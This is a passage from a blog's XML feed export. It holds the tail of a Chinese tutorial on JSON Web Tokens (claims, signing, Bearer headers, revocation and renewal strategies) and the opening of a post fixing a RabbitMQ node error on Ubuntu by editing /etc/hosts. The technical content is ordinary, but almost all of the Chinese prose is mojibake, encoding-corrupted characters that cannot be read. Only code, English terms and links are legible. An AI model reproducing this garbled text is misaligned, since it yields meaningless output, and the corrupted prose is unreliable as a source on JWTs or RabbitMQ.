æ•°æ®çš„å£°æ˜(claims),ä¸€èˆ¬å­˜æ”¾ä¸€äº›ä¸æ•æ„Ÿçš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨æˆ·åã€æƒé™ã€è§’è‰²ç­‰</p><p>å£°æ˜(claims)ä¹Ÿåˆ†ä¸ºä¸‰ç§:Registered claim,Public claimså’ŒPrivate claims.</p><ul><li><p>Registered claim(å·²æ³¨å†Œå£°æ˜):å…¶ä¸­åŒ…å«äº†ä¸€ç»„å®˜æ–¹å®šä¹‰å¥½çš„æ¨èçš„å£°æ˜(å…±7ä¸ª),æœ‰</p><ol><li>iss (issuer)ï¼šç­¾å‘äºº</li><li>exp (expiration time)ï¼šè¿‡æœŸæ—¶é—´</li><li>sub (subject)ï¼šä¸»é¢˜</li><li>aud (audience)ï¼šå—ä¼—</li><li>nbf (Not Before)ï¼šç”Ÿæ•ˆæ—¶é—´</li><li>iat (Issued At)ï¼šç­¾å‘æ—¶é—´</li><li>jti (JWT ID)ï¼šç¼–å·</li></ol></li><li><p>Public claims(å…¬å¼€å£°æ˜):å£°æ˜åç§°å¯ä»¥ç”±ä½¿ç”¨JWTçš„äººå‘˜éšæ„å®šä¹‰.ç„¶è€Œï¼Œ<strong>ä¸ºäº†é˜²æ­¢å†²çª</strong>ï¼Œä»»ä½•æ–°çš„å£°æ˜åç§°éƒ½åº”è¯¥è¦ä¹ˆåœ¨IANAâ€œJSON Webä»¤ç‰Œå£°æ˜â€æ³¨å†Œä¸­å¿ƒæ³¨å†Œ,è¦ä¹ˆå¾—åŒ…å«é˜²æ’(å†²çª)åç§°.</p></li><li><p>Private claims(ç§æœ‰å£°æ˜):JWTçš„ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¸€è‡´åŒæ„ä½¿ç”¨çš„ä¸æ˜¯å·²æ³¨å†Œå£°æ˜å’Œå…¬å¼€å£°æ˜çš„å£°æ˜.ç§æœ‰å£°æ˜å¯èƒ½ä¼šå‘ç”Ÿå†²çªï¼Œåº”è¯¥å°å¿ƒä½¿ç”¨.</p></li></ul><p>ä¾‹å¦‚:<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>ç„¶åï¼Œè¿™ä¸ªJSONè¢«Base64Urlç¼–ç ï¼Œå½¢æˆJWTçš„ç¬¬äºŒéƒ¨åˆ†ã€‚</p><p>åº”å½“æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºå·²ç­¾åçš„ä»¤ç‰Œï¼Œè¿™äº›ä¿¡æ¯è™½ç„¶å—åˆ°ä¿æŠ¤ï¼Œä¸ä¼šè¢«ç¯¡æ”¹ï¼Œä½†ä»»ä½•äººéƒ½å¯ä»¥è¯»å–ã€‚é™¤éç»è¿‡åŠ å¯†ï¼Œå¦åˆ™ä¸è¦å°†æœºå¯†ä¿¡æ¯æ”¾å…¥JWTçš„æœ‰æ•ˆè½½è·æˆ–æ ‡å¤´å…ƒç´ ä¸­ã€‚</p><h4 id="Signatureï¼ˆç­¾åï¼‰"><a href="#Signatureï¼ˆç­¾åï¼‰" class="headerlink" title="Signatureï¼ˆç­¾åï¼‰"></a>Signatureï¼ˆç­¾åï¼‰</h4><p>è¦åˆ›å»ºç­¾åéƒ¨åˆ†ï¼Œæ‚¨å¿…é¡»è·å–ç¼–ç çš„æ ‡å¤´ã€ç¼–ç çš„æœ‰æ•ˆè½½è·ã€ç§˜é’¥ã€æ ‡å¤´ä¸­æŒ‡å®šçš„ç®—æ³•ï¼Œå¹¶å¯¹å…¶è¿›è¡Œç­¾åã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœè¦ä½¿ç”¨HMAC SHA256ç®—æ³•ï¼Œåˆ™å°†ä»¥ä»¥ä¸‹æ–¹å¼åˆ›å»ºç­¾åï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">HMACSHA256</span>(</span><br><span class="line">  <span class="title function_">base64UrlEncode</span>(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  <span class="title function_">base64UrlEncode</span>(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure></p><p>ç­¾åç”¨äºéªŒè¯æ¶ˆæ¯åœ¨å‘é€è¿‡ç¨‹ä¸­æ²¡æœ‰æ›´æ”¹ï¼Œåœ¨ä½¿ç”¨ç§é’¥ç­¾åçš„ä»¤ç‰Œçš„æƒ…å†µä¸‹ï¼Œå®ƒè¿˜å¯ä»¥éªŒè¯JWTçš„å‘é€è€…æ˜¯å¦å°±æ˜¯å®ƒæ‰€è¯´çš„é‚£ä¸ªäººã€‚</p><h4 id="JWTæ˜¯å¦‚ä½•å·¥ä½œçš„"><a href="#JWTæ˜¯å¦‚ä½•å·¥ä½œçš„" class="headerlink" title="JWTæ˜¯å¦‚ä½•å·¥ä½œçš„?"></a>JWTæ˜¯å¦‚ä½•å·¥ä½œçš„?</h4><p>åœ¨è®¤è¯çš„æ—¶å€™ï¼Œå½“ç”¨æˆ·ç”¨ä»–ä»¬çš„å‡­è¯æˆåŠŸç™»å½•ä»¥åï¼Œä¸€ä¸ªJWTå°†ä¼šè¢«è¿”å›ã€‚æ­¤åï¼Œtoken å°±æ˜¯ç”¨æˆ·å‡­è¯äº†ï¼Œä½ å¿…é¡»éå¸¸å°å¿ƒä»¥é˜²æ­¢å‡ºç°å®‰å…¨é—®é¢˜ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œä½ ä¿å­˜ä»¤ç‰Œçš„æ—¶å€™ä¸åº”è¯¥è¶…è¿‡ä½ æ‰€éœ€è¦å®ƒçš„æ—¶é—´ã€‚</p><p>æ— è®ºä½•æ—¶ç”¨æˆ·æƒ³è¦è®¿é—®å—ä¿æŠ¤çš„è·¯ç”±æˆ–è€…èµ„æºçš„æ—¶å€™ï¼Œç”¨æˆ·ä»£ç†ï¼ˆé€šå¸¸æ˜¯æµè§ˆå™¨ï¼‰éƒ½åº”è¯¥å¸¦ä¸Š JWTï¼Œå…¸å‹çš„ï¼Œé€šå¸¸æ”¾åœ¨ Authorization header ä¸­ï¼Œç”¨ Bearer schemaã€‚</p><p>header åº”è¯¥çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Authorization</span>: <span class="title class_">Bearer</span> <span class="variable constant_">JWT</span></span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨ä¸Šçš„å—ä¿æŠ¤çš„è·¯ç”±å°†ä¼šæ£€æŸ¥ Authorization header ä¸­çš„ JWT æ˜¯å¦æœ‰æ•ˆï¼Œå¦‚æœæœ‰æ•ˆï¼Œåˆ™ç”¨æˆ·å¯ä»¥è®¿é—®å—ä¿æŠ¤çš„èµ„æºã€‚å¦‚æœ JWT åŒ…å«è¶³å¤Ÿå¤šçš„å¿…éœ€çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡å°‘å¯¹æŸäº›æ“ä½œçš„æ•°æ®åº“æŸ¥è¯¢çš„éœ€è¦ï¼Œå°½ç®¡å¯èƒ½å¹¶ä¸æ€»æ˜¯å¦‚æ­¤ã€‚</p><p>å¦‚æœ token  æ˜¯åœ¨æˆæƒå¤´ï¼ˆAuthorization headerï¼‰ä¸­å‘é€çš„ï¼Œé‚£ä¹ˆè·¨æºèµ„æºå…±äº« (CORS) å°†ä¸ä¼šæˆä¸ºé—®é¢˜ï¼Œå› ä¸ºå®ƒä¸ä½¿ç”¨ cookieã€‚</p><p><strong>JWTè®¤è¯æµç¨‹å¦‚ä¸‹:</strong></p><p><img src="https://pb01.s3.bitiful.net/15.png" alt="avatar"></p><ol><li>ç”¨æˆ·ç™»å½•è´¦å·ï¼Œå®¢æˆ·ç«¯å‘é€ POST è¯·æ±‚ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç å‘é€åˆ°æœåŠ¡å™¨ã€‚</li><li>æœåŠ¡å™¨ä¼šéªŒè¯ç”¨æˆ·çš„ç™»å½•ä¿¡æ¯ï¼ˆç”¨æˆ·åã€å¯†ç ï¼‰ï¼Œæ ¡éªŒæˆåŠŸçš„æ—¶å€™ä¼šä½¿ç”¨ JWT ç®—æ³•ï¼Œç”Ÿæˆä¸€ä¸ª token ï¼ˆå·²ç­¾åçš„ tokenï¼‰ã€‚</li><li>æœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯ HTTP 200 çŠ¶æ€ç ï¼Œå¹¶ä¸”ä¼šå°†ç”Ÿæˆçš„ token æ”¾åœ¨è¯·æ±‚å¤´ä¸­ï¼ˆheaderï¼‰ï¼Œå¹¶ä¸èƒ½æ”¾åœ¨è¯·æ±‚ä½“ï¼ˆbodyï¼‰ä¸­ã€‚å®¢æˆ·ç«¯ä¸€èˆ¬ä¼šå°†æ¥æ”¶åˆ°çš„ token å­˜å‚¨åœ¨æµè§ˆå™¨çš„ localstorage,cookie æˆ–è€… sessionstorage ã€‚</li><li>å½“å®¢æˆ·ç«¯ä¹‹åå†å‘æœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œéƒ½ä¼šæºå¸¦ä¸Š token ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥å°† token æ”¾åœ¨ cookie ä¸­è‡ªåŠ¨å‘é€ï¼Œä½†æ˜¯è¿™æ ·ä¸èƒ½è·¨åŸŸå‘é€ï¼‰ã€‚æœ€å¥½çš„åšæ³•æ˜¯å°† token æ”¾åœ¨ http çš„å¤´ä¿¡æ¯ä¸­çš„ Authorization å­—æ®µä¸­ï¼ˆè¿™æ˜¯å®˜æ–¹æ–‡æ¡£å»ºè®®çš„åšæ³•ï¼‰ã€‚</li><li>å½“æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚çš„æ—¶å€™ï¼Œæ¥æ”¶åˆ°äº† token ä¿¡æ¯ï¼Œè¿™æ—¶å€™ JWT è¿›è¡Œåå‘éªŒè¯ï¼ŒéªŒè¯å¯¹åº”çš„ token æ˜¯å¦æ­£ç¡®ã€‚</li><li>å½“æœåŠ¡å™¨äº¤éªŒå®Œæ¯•åï¼Œä¼šäº§ç”Ÿä¸¤ç§æƒ…å†µï¼šç¬¬ä¸€ç§æƒ…å†µå°±æ˜¯æ ¡éªŒæˆåŠŸï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ HTTP 200 çŠ¶æ€ç å’Œå®¢æˆ·ç«¯æ‰€éœ€è¦çš„æ•°æ®ï¼›ç¬¬äºŒç§æƒ…å†µå°±æ˜¯æ ¡éªŒå¤±è´¥ï¼Œè¿™ä¸ªæ—¶å€™ä¼šè¿”å›ç»™å®¢æˆ·ç«¯ HTTP 401 çŠ¶æ€ç ï¼ŒNot authorizedã€‚</li></ol><h4 id="JWTçš„ä¼˜ç¼ºç‚¹"><a href="#JWTçš„ä¼˜ç¼ºç‚¹" class="headerlink" title="JWTçš„ä¼˜ç¼ºç‚¹"></a>JWTçš„ä¼˜ç¼ºç‚¹</h4><ul><li><p><strong>æ— çŠ¶æ€</strong>:JWT è‡ªèº«åŒ…å«äº†èº«ä»½éªŒè¯æ‰€éœ€è¦çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬çš„æœåŠ¡å™¨ä¸éœ€è¦å­˜å‚¨ Session ä¿¡æ¯ã€‚è¿™æ˜¾ç„¶å¢åŠ äº†ç³»ç»Ÿçš„å¯ç”¨æ€§å’Œä¼¸ç¼©æ€§ï¼Œå¤§å¤§å‡è½»äº†æœåŠ¡ç«¯çš„å‹åŠ›ã€‚</p></li><li><p><strong>å•ç‚¹ç™»å½•å‹å¥½</strong>:ä½¿ç”¨ Session è¿›è¡Œèº«ä»½è®¤è¯çš„è¯ï¼Œå®ç°å•ç‚¹ç™»å½•ï¼Œéœ€è¦æˆ‘ä»¬æŠŠç”¨æˆ·çš„ Session ä¿¡æ¯ä¿å­˜åœ¨ä¸€å°ç”µè„‘ä¸Šï¼Œå¹¶ä¸”è¿˜ä¼šé‡åˆ°å¸¸è§çš„ Cookie è·¨åŸŸçš„é—®é¢˜ã€‚ä½†æ˜¯ï¼Œä½¿ç”¨ JWT è¿›è¡Œè®¤è¯çš„è¯ï¼Œ JWT è¢«ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œä¸ä¼šå­˜åœ¨è¿™äº›é—®é¢˜ã€‚</p></li><li><p><strong>æœ‰æ•ˆé¿å…äº† CSRF æ”»å‡»</strong>:CSRF æ”»å‡»éœ€è¦ä¾èµ– Cookie ï¼ŒSession è®¤è¯ä¸­ Cookie ä¸­çš„ SessionID æ˜¯ç”±æµè§ˆå™¨å‘é€åˆ°æœåŠ¡ç«¯çš„ï¼Œåªè¦å‘å‡ºè¯·æ±‚ï¼ŒCookie å°±ä¼šè¢«æºå¸¦ã€‚å€ŸåŠ©è¿™ä¸ªç‰¹æ€§ï¼Œå³ä½¿é»‘å®¢æ— æ³•è·å–ä½ çš„ SessionIDï¼Œåªè¦è®©ä½ è¯¯ç‚¹æ”»å‡»é“¾æ¥ï¼Œå°±å¯ä»¥è¾¾åˆ°æ”»å‡»æ•ˆæœ.JWTä¸€èˆ¬ä¼šé€‰æ‹©å­˜æ”¾åœ¨ localStorage ä¸­ã€‚å‰ç«¯çš„æ¯ä¸€ä¸ªè¯·æ±‚åç»­éƒ½ä¼šé™„å¸¦ä¸Šè¿™ä¸ª JWTï¼Œæ•´ä¸ªè¿‡ç¨‹å‹æ ¹ä¸ä¼šæ¶‰åŠåˆ° Cookieã€‚</p></li><li><p><strong>ä¸å¯æ§</strong>:æˆ‘ä»¬æƒ³è¦åœ¨JWTæœ‰æ•ˆæœŸå†…åºŸå¼ƒä¸€ä¸ªJWTæˆ–è€…æ›´æ”¹å®ƒçš„æƒé™çš„è¯ï¼Œå¹¶ä¸ä¼šç«‹å³ç”Ÿæ•ˆï¼Œé€šå¸¸éœ€è¦ç­‰åˆ°æœ‰æ•ˆæœŸè¿‡åæ‰å¯ä»¥ã€‚</p></li></ul><h4 id="JWTèº«ä»½è®¤è¯å¸¸è§é—®é¢˜åŠè§£å†³åŠæ³•"><a href="#JWTèº«ä»½è®¤è¯å¸¸è§é—®é¢˜åŠè§£å†³åŠæ³•" class="headerlink" title="JWTèº«ä»½è®¤è¯å¸¸è§é—®é¢˜åŠè§£å†³åŠæ³•"></a>JWTèº«ä»½è®¤è¯å¸¸è§é—®é¢˜åŠè§£å†³åŠæ³•</h4><h5 id="æ³¨é”€ç™»å½•ç­‰åœºæ™¯ä¸‹JWTè¿˜æœ‰æ•ˆ"><a href="#æ³¨é”€ç™»å½•ç­‰åœºæ™¯ä¸‹JWTè¿˜æœ‰æ•ˆ" class="headerlink" title="æ³¨é”€ç™»å½•ç­‰åœºæ™¯ä¸‹JWTè¿˜æœ‰æ•ˆ"></a><strong>æ³¨é”€ç™»å½•ç­‰åœºæ™¯ä¸‹JWTè¿˜æœ‰æ•ˆ</strong></h5><ol><li><p><strong>å°†JWTå­˜å…¥å†…å­˜æ•°æ®åº“</strong><br> å°† JWTå­˜å…¥æ•°æ®åº“ä¸­ï¼ŒRedis å†…å­˜æ•°æ®åº“åœ¨è¿™é‡Œæ˜¯ä¸é”™çš„é€‰æ‹©ã€‚å¦‚æœéœ€è¦è®©æŸä¸ª JWT å¤±æ•ˆå°±ç›´æ¥ä» Redis ä¸­åˆ é™¤è¿™ä¸ª JWT å³å¯ã€‚ä½†æ˜¯ï¼Œè¿™æ ·ä¼šå¯¼è‡´æ¯æ¬¡ä½¿ç”¨ JWT å‘é€è¯·æ±‚éƒ½è¦å…ˆä» DB ä¸­æŸ¥è¯¢ JWT æ˜¯å¦å­˜åœ¨çš„æ­¥éª¤ï¼Œè€Œä¸”è¿èƒŒäº† JWT çš„æ— çŠ¶æ€åŸåˆ™ã€‚</p></li><li><p><strong>é»‘åå•æœºåˆ¶</strong><br> ä½¿ç”¨å†…å­˜æ•°æ®åº“æ¯”å¦‚ Redis ç»´æŠ¤ä¸€ä¸ªé»‘åå•ï¼Œå¦‚æœæƒ³è®©æŸä¸ª JWT å¤±æ•ˆçš„è¯å°±ç›´æ¥å°†è¿™ä¸ª JWT åŠ å…¥åˆ° é»‘åå• å³å¯ã€‚ç„¶åï¼Œæ¯æ¬¡ä½¿ç”¨ JWT è¿›è¡Œè¯·æ±‚çš„è¯éƒ½ä¼šå…ˆåˆ¤æ–­è¿™ä¸ª JWT æ˜¯å¦å­˜åœ¨äºé»‘åå•ä¸­ã€‚ç¼ºç‚¹å’Œç¬¬ä¸€ç§æ–¹æ¡ˆç›¸åŒã€‚</p></li><li><p><strong>ä¿®æ”¹å¯†é’¥(Secret)</strong><br> æˆ‘ä»¬ä¸ºæ¯ä¸ªç”¨æˆ·éƒ½åˆ›å»ºä¸€ä¸ªä¸“å±å¯†é’¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è®©æŸä¸ª JWT å¤±æ•ˆï¼Œæˆ‘ä»¬ç›´æ¥ä¿®æ”¹å¯¹åº”ç”¨æˆ·çš„å¯†é’¥å³å¯ã€‚ä½†æ˜¯ï¼Œè¿™æ ·ç›¸æ¯”äºå‰ä¸¤ç§å¼•å…¥å†…å­˜æ•°æ®åº“å¸¦æ¥äº†å±å®³æ›´å¤§ï¼š</p><ul><li><p>å¦‚æœæœåŠ¡æ˜¯åˆ†å¸ƒå¼çš„ï¼Œåˆ™æ¯æ¬¡å‘å‡ºæ–°çš„ JWT æ—¶éƒ½å¿…é¡»åœ¨å¤šå°æœºå™¨åŒæ­¥å¯†é’¥ã€‚ä¸ºæ­¤ï¼Œä½ éœ€è¦å°†å¯†é’¥å­˜å‚¨åœ¨æ•°æ®åº“æˆ–å…¶ä»–å¤–éƒ¨æœåŠ¡ä¸­ï¼Œè¿™æ ·å’Œ Session è®¤è¯å°±æ²¡å¤ªå¤§åŒºåˆ«äº†ã€‚</p></li><li><p>å¦‚æœç”¨æˆ·åŒæ—¶åœ¨ä¸¤ä¸ªæµè§ˆå™¨æ‰“å¼€ç³»ç»Ÿï¼Œæˆ–è€…åœ¨æ‰‹æœºç«¯ä¹Ÿæ‰“å¼€äº†ç³»ç»Ÿï¼Œå¦‚æœå®ƒä»ä¸€ä¸ªåœ°æ–¹å°†è´¦å·é€€å‡ºï¼Œé‚£ä¹ˆå…¶ä»–åœ°æ–¹éƒ½è¦é‡æ–°è¿›è¡Œç™»å½•ï¼Œè¿™æ˜¯ä¸å¯å–çš„</p></li></ul></li><li><p><strong>ä¿æŒä»¤ç‰Œçš„æœ‰æ•ˆæœŸé™çŸ­å¹¶ç»å¸¸è½®æ¢</strong><br> å¾ˆç®€å•çš„ä¸€ç§æ–¹å¼ã€‚ä½†æ˜¯ï¼Œä¼šå¯¼è‡´ç”¨æˆ·ç™»å½•çŠ¶æ€ä¸ä¼šè¢«æŒä¹…è®°å½•ï¼Œè€Œä¸”éœ€è¦ç”¨æˆ·ç»å¸¸ç™»å½•ã€‚</p></li></ol><h5 id="JWTçš„ç»­ç­¾é—®é¢˜"><a href="#JWTçš„ç»­ç­¾é—®é¢˜" class="headerlink" title="JWTçš„ç»­ç­¾é—®é¢˜"></a><strong>JWTçš„ç»­ç­¾é—®é¢˜</strong></h5><ol><li><p><strong>ç±»ä¼¼äºSessionè®¤è¯ä¸­çš„åšæ³•</strong><br> å‡è®¾æœåŠ¡ç«¯ç»™çš„ JWT æœ‰æ•ˆæœŸè®¾ç½®ä¸º 30 åˆ†é’Ÿï¼ŒæœåŠ¡ç«¯æ¯æ¬¡è¿›è¡Œæ ¡éªŒæ—¶ï¼Œå¦‚æœå‘ç° JWT çš„æœ‰æ•ˆæœŸé©¬ä¸Šå¿«è¿‡æœŸäº†ï¼ŒæœåŠ¡ç«¯å°±é‡æ–°ç”Ÿæˆ JWT ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚éƒ½æ£€æŸ¥æ–°æ—§ JWTï¼Œå¦‚æœä¸ä¸€è‡´ï¼Œåˆ™æ›´æ–°æœ¬åœ°çš„ JWTã€‚è¿™ç§åšæ³•çš„é—®é¢˜æ˜¯ä»…ä»…åœ¨å¿«è¿‡æœŸçš„æ—¶å€™è¯·æ±‚æ‰ä¼šæ›´æ–° JWT ,å¯¹å®¢æˆ·ç«¯ä¸æ˜¯å¾ˆå‹å¥½ã€‚</p></li><li><p><strong>æ¯æ¬¡è¯·æ±‚éƒ½è¿”å›æ–°JWT</strong><br> è¿™ç§æ–¹æ¡ˆçš„çš„æ€è·¯å¾ˆç®€å•ï¼Œä½†æ˜¯ï¼Œå¼€é”€ä¼šæ¯”è¾ƒå¤§</p></li><li><p><strong>JWTæœ‰æ•ˆæœŸè®¾ç½®åˆ°åŠå¤œ</strong><br> è¿™ç§æ–¹æ¡ˆæ˜¯ä¸€ç§æŠ˜ä¸­çš„æ–¹æ¡ˆï¼Œä¿è¯äº†å¤§éƒ¨åˆ†ç”¨æˆ·ç™½å¤©å¯ä»¥æ­£å¸¸ç™»å½•ï¼Œé€‚ç”¨äºå¯¹å®‰å…¨æ€§è¦æ±‚ä¸é«˜çš„ç³»ç»Ÿã€‚</p></li><li><p><strong>ç”¨æˆ·ç™»å½•è¿”å›ä¸¤ä¸ªJWT</strong></p><p> ç¬¬ä¸€ä¸ªæ˜¯ accessJWT ï¼Œå®ƒçš„è¿‡æœŸæ—¶é—´ä¸ºJWTæœ¬èº«çš„è¿‡æœŸæ—¶é—´æ¯”å¦‚åŠä¸ªå°æ—¶ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯refreshJWTå®ƒçš„è¿‡æœŸæ—¶é—´æ›´é•¿ä¸€ç‚¹æ¯”å¦‚ä¸º 1 å¤©ã€‚å®¢æˆ·ç«¯ç™»å½•åï¼Œå°† accessJWT å’Œ refreshJWT ä¿å­˜åœ¨æœ¬åœ°ï¼Œæ¯æ¬¡è®¿é—®å°† accessJWT ä¼ ç»™æœåŠ¡ç«¯ã€‚æœåŠ¡ç«¯æ ¡éªŒ accessJWT çš„æœ‰æ•ˆæ€§ï¼Œå¦‚æœè¿‡æœŸçš„è¯ï¼Œå°±å°† refreshJWT ä¼ ç»™æœåŠ¡ç«¯ã€‚å¦‚æœæœ‰æ•ˆï¼ŒæœåŠ¡ç«¯å°±ç”Ÿæˆæ–°çš„ accessJWT ç»™å®¢æˆ·ç«¯ã€‚å¦åˆ™ï¼Œå®¢æˆ·ç«¯å°±é‡æ–°ç™»å½•å³å¯ã€‚</p><p> è¿™ç§æ–¹æ¡ˆçš„ä¸è¶³æ˜¯ï¼š</p><ul><li>éœ€è¦å®¢æˆ·ç«¯æ¥é…åˆï¼›</li><li>ç”¨æˆ·æ³¨é”€çš„æ—¶å€™éœ€è¦åŒæ—¶ä¿è¯ä¸¤ä¸ª JWT éƒ½æ— æ•ˆï¼›</li><li>é‡æ–°è¯·æ±‚è·å– JWT çš„è¿‡ç¨‹ä¸­ä¼šæœ‰çŸ­æš‚ JWT ä¸å¯ç”¨çš„æƒ…å†µï¼ˆå¯ä»¥é€šè¿‡åœ¨å®¢æˆ·ç«¯è®¾ç½®å®šæ—¶å™¨ï¼Œå½“ accessJWT å¿«è¿‡æœŸçš„æ—¶å€™ï¼Œæå‰å»é€šè¿‡ refreshJWT è·å–æ–°çš„ accessJWTï¼‰ã€‚</li></ul></li></ol><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><ol><li><p>JWTå®˜æ–¹æ–‡æ¡£:æœ¬æ–‡å¼€å¤´æœ‰</p></li><li><p><a href="https://javaguide.cn/system-design/security/jwt-intro.html" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">JavaGuide</a></p></li><li><p><a href="https://ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">JSON Web Token å…¥é—¨æ•™ç¨‹</a><br>â€¦â€¦</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQæŠ¥é”™:unable to perform an operation on node &#39;rabbit@ubuntuserver&#39;</title>
      <link href="/2023/11/15/rabbitmq%E6%8A%A5%E9%94%99/"/>
      <url>/2023/11/15/rabbitmq%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<h3 id="RabbitMQæŠ¥é”™-unable-to-perform-an-operation-on-node-â€˜rabbit-ubuntuserverâ€™"><a href="#RabbitMQæŠ¥é”™-unable-to-perform-an-operation-on-node-â€˜rabbit-ubuntuserverâ€™" class="headerlink" title="RabbitMQæŠ¥é”™:unable to perform an operation on node â€˜rabbit@ubuntuserverâ€™"></a>RabbitMQæŠ¥é”™:unable to perform an operation on node â€˜rabbit@ubuntuserverâ€™</h3><hr><p><strong>ç¯å¢ƒ:VMware+Ubuntu</strong></p><hr><h4 id="å‡ºé—®é¢˜çš„å‰ç½®æ­¥éª¤"><a href="#å‡ºé—®é¢˜çš„å‰ç½®æ­¥éª¤" class="headerlink" title="å‡ºé—®é¢˜çš„å‰ç½®æ­¥éª¤:"></a>å‡ºé—®é¢˜çš„å‰ç½®æ­¥éª¤:</h4><ol><li>å®‰è£…Erlang<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install erlang</span><br></pre></td></tr></table></figure></li><li>å®‰è£…RabbitMQ<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install rabbitmq-server</span><br></pre></td></tr></table></figure></li><li>å¼€å¯RabbitMQç®¡ç†é¢æ¿<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rabbitmq-plugins enable rabbitmq_management</span><br></pre></td></tr></table></figure></li><li>åœ¨æŸ¥çœ‹RabbitMQçŠ¶æ€æˆ–ä¸ºRabbitMQæ·»åŠ ç”¨æˆ·æ—¶,å³:<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rabbitmqctl status</span><br></pre></td></tr></table></figure>æˆ–<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rabbitmqctl add_user ç”¨æˆ·å å¯†ç </span><br></pre></td></tr></table></figure>å‡ºç°<strong>Error:unable to perform an operation on node â€˜rabbit@ubuntuserverâ€™</strong></li></ol><p><img src="https://pb01.s3.bitiful.net/9.png" alt="avatar"><br><img src="https://pb01.s3.bitiful.net/10.png" alt="avatar"></p><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•:"></a>è§£å†³æ–¹æ³•:</h4><p><strong>é¦–å…ˆ,åˆ‡æ¢åˆ°rootæƒé™</strong></p><ol><li>ä¸ºrootè®¾ç½®å¯†ç <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>è®¾ç½®å¯†ç </li><li>åˆ‡æ¢åˆ°rootæƒé™<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>ç„¶åè¾“å…¥å¯†ç ä¾¿å¯åˆ‡æ¢åˆ°rootæƒé™</li></ol><p><strong>æ›´æ”¹/etc/hostsæ–‡ä»¶</strong></p><ol><li>å…ˆè¿›æ ¹ç›®å½•<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br></pre></td></tr></table></figure></li><li>è¿›å…¥etcç›®å½•<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br></pre></td></tr></table></figure></li><li>åœ¨hostsæ–‡ä»¶ä¸­æ·»åŠ ä¸»æœºåæ˜ å°„<br>vimæ‰“å¼€hostsæ–‡ä»¶<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi hosts</span><br></pre></td></tr></table></figure>é”®å…¥iè½¬æ¢åˆ°insertæ¨¡å¼<br><img src="https://pb01.s3.bitiful.net/11.png" alt="avatar"></li></ol><p>åœ¨127.0.0.1 localhost åé¢æ·»åŠ ä½ çš„ä¸»æœºå,å°±æ˜¯root@xxxxä¸­çš„xxxx,æˆ‘çš„æ˜¯ubuntuserver</p><p><img src="https://pb01.s3.bitiful.net/12.png" 